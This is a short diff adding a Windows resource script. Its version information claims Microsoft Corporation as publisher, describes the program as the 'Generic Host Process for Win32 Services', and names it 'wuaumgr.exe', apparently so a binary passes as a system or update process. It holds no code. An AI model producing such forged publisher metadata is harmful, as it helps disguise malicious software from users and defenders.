@@ -1,0 +1,31 @@
+
+
+APPICON ICON "Icon.ico"
+
+1 VERSIONINFO
+FILEVERSION 5,1,2600,0
+PRODUCTVERSION 5,1,2600,0
+FILEOS 0x40004
+FILETYPE 0x1
+{
+BLOCK "StringFileInfo"
+{
+	BLOCK "040904B0"
+	{
+		VALUE "CompanyName", "Microsoft Corporation"
+		VALUE "FileDescription", "Generic Host Process for Win32 Services"
+		VALUE "FileVersion", "5.1.2700.0 (NT client.010817-1148)"
+		VALUE "InternalName", "wuaumgr.exe"
+		VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved."
+		VALUE "OriginalFilename", "wuaumgr.exe"
+		VALUE "ProductName", "Microsoft® Windows® Operating System"
+		VALUE "ProductVersion", "5.1.2700.0"
+	}
+}
+
+BLOCK "VarFileInfo"
+{
+	VALUE "Translation", 0x0409 0x04B0
+}
+}
+
